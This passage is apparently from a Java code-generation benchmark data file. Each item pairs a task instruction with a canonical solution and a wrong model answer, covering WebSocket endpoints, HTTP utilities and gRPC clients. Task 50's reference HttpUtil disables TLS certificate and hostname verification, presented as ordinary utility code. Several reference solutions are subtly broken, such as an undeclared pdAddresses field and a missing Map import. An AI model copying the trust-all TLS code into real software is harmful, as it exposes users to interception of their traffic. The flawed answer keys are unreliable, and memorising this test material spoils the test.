    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle client connections, messages, and disconnections.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing WebSocket connections and handling communication events.\n\nAttributes:\n- address: InetSocketAddress - The network address and port on which the server listens for connections\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress address) -> void - Initializes the WebSocket server with the specified address\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new WebSocket connection is established\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a WebSocket connection is closed\n- onMessage: onMessage(WebSocket conn, String message) -> void - Called when a message is received from a WebSocket client\n- onError: onError(WebSocket conn, Exception ex) -> void - Called when an error occurs with a WebSocket connection\n- onStart: onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new WebSocket connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle WebSocket connection closing\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Handle incoming WebSocket message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle WebSocket errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Handle server startup\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "wrong_result": "public class MyWebSocketServer extends WebSocketServer {\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle connection closure\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Handle incoming message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server started\n    }\n}"
  },
  {
    "Task_id": 485,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data communication asynchronously using ByteBuffer.\n\nClass Description: This class represents a WebSocket server endpoint that receives binary data from clients and echoes it back asynchronously. The endpoint is mapped to the \"/bytebuffer\" path and uses Java's WebSocket API for communication.\n\nAttributes: None\n\nMethods:\n- echoByteBuffer(ByteBuffer data, Session session) -> void - Handles incoming binary messages from WebSocket clients. Receives the binary data as a ByteBuffer and the client's Session object, then asynchronously sends the same data back to the client. The method uses the session's async remote endpoint to send the response without blocking.\n\nInput:\n- data: ByteBuffer - The binary data received from the client\n- session: Session - The WebSocket session object representing the client connection\n\nOutput: None (The method sends data back to the client through the session object but doesn't return anything)",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/bytebuffer\")\npublic class MyAsyncEndpointByteBuffer {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/bytebuffer\")\npublic class ByteBufferEndpoint {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}"
  },
  {
    "Task_id": 487,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data streams from clients and echoes them back.\n\nClass Description: This class represents a WebSocket server endpoint that receives binary data streams from clients and sends back the same data. It uses Java EE's WebSocket API to create a server endpoint at \"/inputstream\" path.\n\nAttributes: None\n\nMethods:\n- echoStream: [InputStream, Session] -> [void] - Handles incoming binary stream messages. Reads 12 bytes from the input stream and sends them back to the client using the WebSocket session. The method prints the received stream to console for debugging purposes. Throws IOException if there's an error during stream operations.\n\nInput:\n- stream: [InputStream] - The binary input stream received from the client\n- session: [Session] - The WebSocket session object representing the client connection\n\nOutput: None (sends binary data back through the WebSocket session)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/inputstream\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        System.out.println(\"echoStream: \" + stream);\n        byte[] b = new byte[12];\n        stream.read(b);\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(b));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/inputstream\")\npublic class WebSocketEndpoint {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        byte[] buffer = new byte[12];\n        int bytesRead = stream.read(buffer);\n        if (bytesRead != 12) {\n            throw new IOException(\"Expected 12 bytes but read \" + bytesRead);\n        }\n        System.out.println(\"Received: \" + Arrays.toString(buffer));\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(buffer, 0, bytesRead));\n    }\n}"
  },
  {
    "Task_id": 49,
    "Instruction": "Task Description: Create a Java HTTP client class that simplifies making HTTP requests (GET, POST, DELETE) to a base URI, with support for parameterized URLs and exception handling.\n\nClass Description: TeenyHttpClient is a lightweight HTTP client wrapper that provides methods for common HTTP operations. It handles request construction, execution, and basic response handling while abstracting away boilerplate code.\n\nAttributes:\nbaseUri: String - The base URL to which all requests will be appended\nhttpClient: HttpClient - The underlying HttpClient instance used for making requests\n\nMethods:\nget: get(String url) -> HttpResponse<String> - Sends a GET request to the specified URL appended to the base URI\nget: get(String url, Object... params) -> HttpResponse<String> - Sends a GET request with URL parameters (formatted using String.format)\ndelete: delete(String url, Object... params) -> HttpResponse<String> - Sends a DELETE request with URL parameters\npost: post(String url, Object... params) -> HttpResponse<String> - Sends a POST request with URL parameters (with empty body)\nunchecked: unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) -> T - Helper method that wraps checked exceptions in RuntimeException",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\n\npublic class TeenyHttpClient {\n\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = baseUri;\n        httpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_1_1)\n                .build();\n    }\n\n    public HttpResponse<String> get(String url) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + url))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> get(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .DELETE()\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> post(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .POST(HttpRequest.BodyPublishers.noBody())\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    private <T> T unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Objects;\n\npublic class TeenyHttpClient {\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = Objects.requireNonNull(baseUri, \"baseUri cannot be null\");\n        this.httpClient = HttpClient.newHttpClient();\n    }\n\n    public HttpResponse<String> get(String url) {\n        return unchecked(() -> sendRequest(\"GET\", baseUri + url));\n    }\n\n    public HttpResponse<String> get(String url, Object... params) {\n        String formattedUrl = String.format(url, params);\n        return unchecked(() -> sendRequest(\"GET\", baseUri + formattedUrl));\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) {\n        String formattedUrl = String.format(url, params);\n        return unchecked(() -> sendRequest(\"DELETE\", baseUri + formattedUrl));\n    }\n\n    public HttpResponse<String> post(String url, Object... params) {\n        String formattedUrl = String.format(url, params);\n        return unchecked(() -> sendRequest(\"POST\", baseUri + formattedUrl));\n    }\n\n    private HttpResponse<String> sendRequest(String method, String url) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .method(method, HttpRequest.BodyPublishers.noBody())\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public <T> T unchecked(ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 491,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java that handles client connections, text messages, and binary messages. The class should manage WebSocket sessions and echo received messages back to clients.\n\nClass Description: The MyEndpoint class is a WebSocket server endpoint that listens for client connections on the \"/websocket\" path. It handles text and binary messages, providing echo functionality while logging connection and message details.\n\nAttributes:\n- None (All required session information is passed through method parameters)\n\nMethods:\n- onOpen: [onOpen](Session session) -> void - Handles new WebSocket connections and logs the client's request URI.\n- echoText: [echoText](String data, boolean part) -> String - Handles incoming text messages, logs message details, and returns the same message (echo). The boolean parameter indicates if the message is complete or partial.\n- echoBinary: [echoBinary](ByteBuffer data, Session session) -> void - Handles incoming binary messages, logs message details, and sends the same binary data back to the client (echo). Throws IOException if sending fails.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(value = \"/websocket\")\npublic class MyEndpoint {\n\n    @OnOpen\n    public void onOpen(Session session) {\n        System.out.println(\"Connected from: \" + session.getRequestURI());\n    }\n\n    @OnMessage\n    public String echoText(String data, boolean part) {\n        System.out.println(\"boolean(text) \" + data);\n        System.out.println(\"text length \" + data.length());\n        if (part) {\n            System.out.println(\"whole message received\");\n        } else {\n            System.out.println(\"partial message received\");\n        }\n        return data;\n    }\n\n    @OnMessage\n    public void echoBinary(ByteBuffer data, Session session) throws IOException {\n        System.out.println(\"boolean(binary) \" + data);\n        System.out.println(\"binary length \" + data.array().length);\n        session.getBasicRemote().sendBinary(data);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/websocket\")\npublic class MyEndpoint {\n\n    private static final java.util.logging.Logger logger = java.util.logging.Logger.getLogger(MyEndpoint.class.getName());\n\n    public void onOpen(Session session) {\n        logger.info(\"Client connected: \" + session.getRequestURI().getPath());\n    }\n\n    public String echoText(String data, boolean part) {\n        logger.info(\"Received text message: \" + data + \" (complete: \" + (!part) + \")\");\n        return data;\n    }\n\n    public void echoBinary(ByteBuffer data, Session session) {\n        try {\n            logger.info(\"Received binary message of size: \" + data.remaining());\n            session.getBasicRemote().sendBinary(data);\n        } catch (IOException e) {\n            logger.severe(\"Error sending binary message: \" + e.getMessage());\n            throw new java.lang.RuntimeException(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that echoes received text messages back to the client asynchronously.\n\nClass Description: This class represents a WebSocket server endpoint that handles text-based communication with clients. It listens for incoming text messages and echoes them back to the sender using asynchronous communication.\n\nAttributes: None\n\nMethods:\n- echoText: [String text, Session session] -> void - Handles incoming text messages from clients. Takes the received text and the client session as input, then sends the same text back to the client asynchronously using the session's async remote endpoint.",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/text\")\npublic class MyAsyncEndpointText {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/echo\")\npublic class EchoWebSocket {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Create a gRPC client class for service discovery that handles connection management, stub creation, and remote method invocation with retry logic.\n\nClass Description: DiscoveryClient is a gRPC client implementation that manages connections to a discovery service, provides thread-safe operations, and includes automatic retry mechanisms for failed requests.\n\nAttributes:\n- requireResetStub: AtomicBoolean - Flag indicating whether the stub needs to be reset\n- channel: ManagedChannel - The gRPC communication channel\n- registerStub: DiscoveryServiceBlockingStub - Blocking stub for registration operations  \n- blockingStub: DiscoveryServiceBlockingStub - Blocking stub for general operations\n- readWriteLock: ReentrantReadWriteLock - Lock for thread-safe operations\n- pdAddresses: List<String> - Server addresses (implied from usage)\n\nMethods:\n- DiscoveryClient(String centerAddress) -> None - Constructor that initializes the client with target server address\n- getNodeInfos(Query query) -> NodeInfos - Retrieves node information from discovery service with retry logic\n- tryWithTimes(Function<V,R> function, V v) -> R - Helper method implementing retry logic for operations\n- resetStub() -> None - Resets the channel and stubs when connection issues occur  \n- resetChannel(String address) -> None - Recreates the channel and stubs with a new address\n- close() -> None - Shuts down the channel and cleans up resources\n\nThe class demonstrates proper gRPC client patterns including:\n1. Channel lifecycle management\n2. Thread-safe stub operations\n3. Connection retry mechanisms\n4. Resource cleanup\n5. Error handling for network operations",
    "Canonical_solution": "import org.apache.hugegraph.pd.grpc.discovery.DiscoveryServiceGrpc;\nimport org.apache.hugegraph.pd.grpc.discovery.NodeInfos;\nimport org.apache.hugegraph.pd.grpc.discovery.Query;\nimport org.apache.hugegraph.pd.grpc.discovery.RegisterInfo;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\nimport java.util.function.Function;\n\npublic class DiscoveryClient {\n\n    private final AtomicBoolean requireResetStub = new AtomicBoolean(false);\n    private ManagedChannel channel = null;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub registerStub;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub blockingStub;\n    private ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n\n    public DiscoveryClient(String centerAddress) {\n        resetChannel(centerAddress);\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes((q) -> {\n            this.readWriteLock.readLock().lock();\n            NodeInfos nodes;\n            try {\n                nodes = this.blockingStub.getNodes(q);\n            } finally {\n                this.readWriteLock.readLock().unlock();\n            }\n            return nodes;\n        }, query);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        R r;\n        Exception ex = null;\n        for (int i = 0; i < 3; i++) {\n            try {\n                r = function.apply(v);\n                return r;\n            } catch (Exception e) {\n                requireResetStub.set(true);\n                resetStub();\n                ex = e;\n            }\n        }\n        if (ex != null) {\n            throw new RuntimeException(\"Discovery method failed\", ex);\n        }\n        return null;\n    }\n\n    private void resetStub() {\n        if (requireResetStub.get()) {\n            try {\n                resetChannel(pdAddresses.get(0));\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to reset stub\", e);\n            }\n        }\n    }\n\n    private void resetChannel(String address) {\n        readWriteLock.writeLock().lock();\n        try {\n            if (requireResetStub.get()) {\n                if (channel != null) {\n                    channel.shutdownNow();\n                    channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n                }\n                channel = ManagedChannelBuilder.forTarget(address)\n                        .usePlaintext().build();\n                this.registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                this.blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                requireResetStub.set(false);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to reset channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    public void close() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (channel != null) {\n                channel.shutdownNow();\n                channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to close channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public class DiscoveryClient {\n    private final AtomicBoolean requireResetStub;\n    private final ManagedChannel channel;\n    private final DiscoveryServiceBlockingStub registerStub;\n    private final DiscoveryServiceBlockingStub blockingStub;\n    private final ReentrantReadWriteLock readWriteLock;\n    private final List<String> pdAddresses;\n\n    public DiscoveryClient(String centerAddress) {\n        this.pdAddresses = Arrays.asList(centerAddress);\n        this.channel = ManagedChannelBuilder.forAddress(centerAddress, 50051)\n                .usePlaintext()\n                .build();\n        this.registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n        this.blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n        this.readWriteLock = new ReentrantReadWriteLock();\n        this.requireResetStub = new AtomicBoolean(false);\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes((v) -> {\n            readWriteLock.readLock().lock();\n            try {\n                return blockingStub.getNodeInfos(v);\n            } finally {\n                readWriteLock.readLock().unlock();\n            }\n        }, query);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        int retries = 3;\n        for (int i = 0; i <= retries; i++) {\n            try {\n                return function.apply(v);\n            } catch (Exception e) {\n                if (i == retries) throw e;\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException ie) {\n                    Thread.currentThread().interrupt();\n                    throw new RuntimeException(\"Interrupted during retry\", ie);\n                }\n            }\n        }\n        return null;\n    }\n\n    private void resetStub() {\n        readWriteLock.writeLock().lock();\n        try {\n            resetChannel(pdAddresses.get(0));\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    private void resetChannel(String address) {\n        if (channel != null) {\n            channel.shutdown();\n        }\n        channel = ManagedChannelBuilder.forAddress(address, 50051)\n                .usePlaintext()\n                .build();\n        registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n        blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n    }\n\n    public void close() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (channel != null) {\n                channel.shutdownNow();\n            }\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n}"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to a gRPC server for executing GraphQL queries and handling responses asynchronously.\n\nClass Description: The GraphQlGrpcClient class establishes a connection to a gRPC server, provides functionality to execute GraphQL queries, and handles server responses asynchronously. It manages the gRPC channel lifecycle and provides cleanup methods.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [GraphQlServiceGrpc.GraphQlServiceStub] - The asynchronous gRPC stub for making service calls\n- ON_COMPLETE: [CountDownLatch] - Synchronization aid to wait for response completion\n- logger: [Logger] - Logger instance for logging client activities\n\nMethods:\n- GraphQlGrpcClient(String host, int port) -> [Constructor] - Creates a client instance with specified host and port, using plaintext connection\n- GraphQlGrpcClient(ManagedChannel channel) -> [Constructor] - Creates a client instance with an existing channel\n- shutdown() -> [void] - Shuts down the channel gracefully with a 5-second timeout\n- query(String query) -> [void] - Executes a GraphQL query asynchronously and logs responses/errors",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.examples.graphql.GraphQlRequest;\nimport io.grpc.examples.graphql.GraphQlResponse;\nimport io.grpc.examples.graphql.GraphQlServiceGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class GraphQlGrpcClient {\n  private static final Logger logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n\n  private final ManagedChannel channel;\n  private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n  private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n\n  public GraphQlGrpcClient(String host, int port) {\n    this(ManagedChannelBuilder.forAddress(host, port).usePlaintext().build());\n  }\n\n  GraphQlGrpcClient(ManagedChannel channel) {\n    this.channel = channel;\n    stub = GraphQlServiceGrpc.newStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public void query(String query) {\n    GraphQlRequest request =\n        GraphQlRequest.newBuilder().build().newBuilder().setQuery(query).build();\n\n    stub.execute(\n        request,\n        new StreamObserver<GraphQlResponse>() {\n          @Override\n          public void onNext(GraphQlResponse value) {\n            logger.info(\"onNext: \" + value);\n          }\n\n          @Override\n          public void onError(Throwable t) {\n            logger.log(Level.WARNING, t, () -> \"onError\");\n            ON_COMPLETE.countDown();\n          }\n\n          @Override\n          public void onCompleted() {\n            logger.info(\"onCompleted\");\n            ON_COMPLETE.countDown();\n          }\n        });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public class GraphQlGrpcClient {\n    private final ManagedChannel channel;\n    private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n    private final CountDownLatch ON_COMPLETE;\n    private final Logger logger;\n\n    public GraphQlGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n        this.ON_COMPLETE = new CountDownLatch(1);\n        this.logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n    }\n\n    public GraphQlGrpcClient(ManagedChannel channel) {\n        this.channel = channel;\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n        this.ON_COMPLETE = new CountDownLatch(1);\n        this.logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.shutdownGracefully().await(5, TimeUnit.SECONDS);\n        }\n    }\n\n    public void query(String query) {\n        GraphQlRequest request = GraphQlRequest.newBuilder().setQuery(query).build();\n        stub.executeQuery(request, new StreamObserver<GraphQlResponse>() {\n            @Override\n            public void onNext(GraphQlResponse response) {\n                logger.info(\"Received response: \" + response);\n                ON_COMPLETE.countDown();\n            }\n\n            @Override\n            public void onError(Throwable t) {\n                logger.severe(\"Error occurred: \" + t.getMessage());\n                ON_COMPLETE.countDown();\n            }\n\n            @Override\n            public void onCompleted() {\n                logger.fine(\"Query completed\");\n                ON_COMPLETE.countDown();\n            }\n\n            @Override\n            public void onClosed() {\n                // Handle stream closure if needed\n            }\n        });\n    }\n}"
  },
  {
    "Task_id": 50,
    "Instruction": "Task Description: Create a Java utility class for making HTTP/HTTPS requests with support for custom timeouts, request methods, content types, and handling of both successful and error responses.\n\nClass Description: HttpUtil is a utility class that provides methods for making HTTP/HTTPS requests. It handles both secure (HTTPS) and non-secure (HTTP) connections, supports various request methods (GET, POST, etc.), and includes proper error handling and resource cleanup.\n\nAttributes:\n- Timeout: [int] - Default timeout value for connections (5000ms)\n- DefalutEncoding: [String] - Default character encoding for requests/responses (\"UTF-8\")\n- currentProxy: [Map] - Storage for proxy configuration (currently unused in the reference implementation)\n- allHostsValid: [HostnameVerifier] - Custom hostname verifier that accepts all HTTPS hosts\n\nMethods:\n- httpRequest: [httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding)] -> [String] - Makes an HTTP/HTTPS request with specified parameters and returns the response as a string\n- readString: [readString(InputStream inputStream, String encoding)] -> [String] - Helper method to read an InputStream into a String with specified encoding\n- X509TrustUtiil: [Nested class implementing X509TrustManager] - Custom trust manager that accepts all certificates for HTTPS connections\n\nThe class handles:\n1. Both HTTP and HTTPS connections\n2. Custom timeouts for connect and read operations\n3. Various request methods (GET, POST, etc.)\n4. Request headers (particularly Content-Type)\n5. Request body for POST requests\n6. Proper error stream handling\n7. Resource cleanup (connection closing, stream closing)\n8. SSL certificate verification bypass for HTTPS\n9. Character encoding for requests and responses",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.HashMap;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpUtil {\n    private static final int Timeout = 5000;\n    private static final String DefalutEncoding = \"UTF-8\";\n    private static Map currentProxy = new HashMap();\n    public static HostnameVerifier allHostsValid = new HostnameVerifier() {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) throws Exception {\n        if (\"\".equals(encoding) || encoding == null) {\n            encoding = DefalutEncoding;\n        }\n\n        URLConnection httpUrlConn = null;\n        HttpsURLConnection hsc = null;\n        HttpURLConnection hc = null;\n        InputStream inputStream = null;\n\n        String result;\n        try {\n            URL url = new URL(requestUrl);\n            if (requestUrl.startsWith(\"https\")) {\n                SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                TrustManager[] tm = new TrustManager[]{new X509TrustUtiil()};\n                sslContext.init(null, tm, new SecureRandom());\n                SSLSocketFactory ssf = sslContext.getSocketFactory();\n                hsc = (HttpsURLConnection) url.openConnection();\n                hsc.setSSLSocketFactory(ssf);\n                hsc.setHostnameVerifier(allHostsValid);\n                httpUrlConn = hsc;\n            } else {\n                hc = (HttpURLConnection) url.openConnection();\n                hc.setRequestMethod(requestMethod);\n                hc.setInstanceFollowRedirects(false);\n                httpUrlConn = hc;\n            }\n\n            httpUrlConn.setConnectTimeout(timeOut);\n            httpUrlConn.setReadTimeout(timeOut);\n            if (contentType != null && !\"\".equals(contentType)) {\n                httpUrlConn.setRequestProperty(\"Content-Type\", contentType);\n            }\n\n            httpUrlConn.setDoOutput(true);\n            httpUrlConn.setDoInput(true);\n            httpUrlConn.connect();\n            if (null != postString && !\"\".equals(postString)) {\n                OutputStream outputStream = httpUrlConn.getOutputStream();\n                outputStream.write(postString.getBytes(encoding));\n                outputStream.flush();\n                outputStream.close();\n            }\n\n            inputStream = httpUrlConn.getInputStream();\n            result = readString(inputStream, encoding);\n            return result;\n        } catch (IOException var18) {\n            if (hsc == null) {\n                if (hc != null) {\n                    result = readString(hc.getErrorStream(), encoding);\n                    return result;\n                }\n                result = \"\";\n                return result;\n            }\n            result = readString(hsc.getErrorStream(), encoding);\n        } finally {\n            if (hsc != null) {\n                hsc.disconnect();\n            }\n            if (hc != null) {\n                hc.disconnect();\n            }\n        }\n        return result;\n    }\n\n    public static String readString(InputStream inputStream, String encoding) throws IOException {\n        BufferedInputStream bis = null;\n        ByteArrayOutputStream baos = null;\n\n        try {\n            bis = new BufferedInputStream(inputStream);\n            baos = new ByteArrayOutputStream();\n            byte[] arr = new byte[1];\n\n            int len;\n            while ((len = bis.read(arr)) != -1) {\n                baos.write(arr, 0, len);\n            }\n        } finally {\n            if (baos != null) {\n                baos.flush();\n                baos.close();\n            }\n            if (bis != null) {\n                bis.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            return baos.toString(encoding);\n        }\n    }\n\n    static class X509TrustUtiil implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
